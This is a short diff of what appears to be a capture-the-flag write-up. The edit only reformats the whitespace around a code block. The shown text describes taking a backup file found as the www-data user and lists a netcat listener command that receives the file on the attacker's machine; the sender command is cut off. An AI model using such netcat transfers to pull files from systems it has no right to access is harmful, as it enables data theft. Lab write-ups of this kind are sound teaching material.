@@ -110,10 +110,12 @@ while enumerating the system  With our current user (www-data) I found a backup 
 I send the file to my machine to inspect it.
 
 * On receiving machine:
-```bash
 
+
+```bash
 nc -nlvp 443  > surv.zip 
 ```
+
 * On Sender Machine:
 
 ```bash
